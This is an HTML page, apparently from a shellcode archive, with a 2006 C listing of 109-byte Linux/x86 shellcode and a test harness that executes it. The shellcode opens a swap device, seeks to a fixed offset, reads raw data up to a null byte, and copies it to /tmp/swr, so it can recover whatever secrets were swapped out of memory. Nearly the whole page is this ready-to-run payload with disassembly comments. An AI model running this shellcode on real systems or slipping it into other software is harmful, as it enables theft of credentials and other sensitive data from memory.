<html><head><title>Linux/x86 - SWAP restore - 109 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * linux-x86-swap-restore.c - SWAP restore shellcode 109 bytes for Linux/x86
 * Copyright (c) 2006 Gotfault Security &amp; rfdslabs
 *
 * Authors:
 *
 *      dx      &lt;xgc@gotfault.net&gt;
 *      spud    &lt;gustavo@rfdslabs.com.br&gt;
 *
 * This shellcode reads the swap device at offset 31337. After it searchs by
 * NULL byte, it stops and write the readed content to '/tmp/swr' file.
 * Probaly you needs to change the device path name in open() device syscall.
 *
 */

char shellcode[] =

  /* open(device, O_RDONLY) */

  &quot;\x6a\x05&quot;                    // push   $0x5
  &quot;\x58&quot;                        // pop    %eax
  &quot;\x99&quot;                        // cltd   
  &quot;\x52&quot;                        // push   %edx
  &quot;\x68\x73\x64\x61\x31&quot;        // push   $0x31616473
  &quot;\x68\x64\x65\x76\x2f&quot;        // push   $0x2f766564
  &quot;\x66\x68\x2f\x2f&quot;            // pushw  $0x2f2f
  &quot;\x89\xe3&quot;                    // mov    %esp,%ebx
  &quot;\x52&quot;                        // push   %edx
  &quot;\x59&quot;                        // pop    %ecx
  &quot;\xcd\x80&quot;                    // int    $0x80

  &quot;\x93&quot;                        // xchg   %eax,%ebx

  /* lseek(fd_device, 31337, SEEK_SET) */

  &quot;\x31\xc9&quot;                    // xor    %ecx,%ecx
  &quot;\x6a\x13&quot;                    // push   $0x13
  &quot;\x58&quot;                        // pop    %eax
  &quot;\x66\xb9\x69\x7a&quot;            // mov    $0x7a69,%cx
  &quot;\xcd\x80&quot;                    // int    $0x80

  /* read(fd_device, *buf, 1025) */

  &quot;\x89\xe1&quot;                    // mov    %esp,%ecx
  &quot;\x42&quot;                        // inc    %edx
  &quot;\xc1\xe2\x0a&quot;                // shl    $0xa,%edx
  &quot;\x42&quot;                        // inc    %edx
  &quot;\x6a\x03&quot;                    // push   $0x3
  &quot;\x58&quot;                        // pop    %eax
  &quot;\xcd\x80&quot;                    // int    $0x80

  &quot;\x89\xe6&quot;                    // mov    %esp,%esi
  &quot;\x99&quot;                        // cltd   
  &quot;\x31\xff&quot;                    // xor    %edi,%edi

  /* counter loop - read each byte and searchs by 0x0. */

  &quot;\xac&quot;                        // lods   %ds
  &quot;\x38\xd0&quot;                    // cmp    %dl,%al
  &quot;\x74\x04&quot;                    // je     80480b3 &lt;close_device&gt;
  &quot;\x47&quot;                        // inc    %edi
  &quot;\xeb\xf8&quot;                    // jmp    80480aa &lt;counter&gt;

  &quot;\x91&quot;                        // xchg   %eax,%ecx

  /* close(fd_device) */

  &quot;\x6a\x06&quot;                    // push   $0x6
  &quot;\x58&quot;                        // pop    %eax
  &quot;\xcd\x80&quot;                    // int    $0x80
  &quot;\x89\xe6&quot;                    // mov    %esp,%esi

  /* open(&quot;/tmp/swr&quot;, O_CREAT|O_APPEND|O_WRONLY) */

  &quot;\x66\xb9\x41\x04&quot;            // mov    $0x441,%cx
  &quot;\x52&quot;                        // push   %edx
  &quot;\x68\x2f\x73\x77\x72&quot;        // push   $0x7277732f
  &quot;\x68\x2f\x74\x6d\x70&quot;        // push   $0x706d742f
  &quot;\x89\xe3&quot;                    // mov    %esp,%ebx
  &quot;\xb0\x05&quot;                    // mov    $0x5,%al
  &quot;\xcd\x80&quot;                    // int    $0x80

  &quot;\x93&quot;                        // xchg   %eax,%ebx

  /* write(fd_filename, *buf, sizeof(buffer)) */

  &quot;\x6a\x04&quot;                    // push   $0x4
  &quot;\x58&quot;                        // pop    %eax
  &quot;\x56&quot;                        // push   %esi
  &quot;\x59&quot;                        // pop    %ecx
  &quot;\x89\xfa&quot;                    // mov    %edi,%edx
  &quot;\xcd\x80&quot;                    // int    $0x80

  /* close(fd_filename) */

  &quot;\xb0\x06&quot;                    // mov    $0x6,%al
  &quot;\xcd\x80&quot;                    // int    $0x80

  /* exit(anything) */

  &quot;\xb0\x01&quot;                    // mov    $0x1,%al
  &quot;\xcd\x80&quot;                    // int    $0x80
;

int main() {
 
        int (*f)() = (int(*)())shellcode;
        printf(&quot;Length: %u\n&quot;, strlen(shellcode));
        f();
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
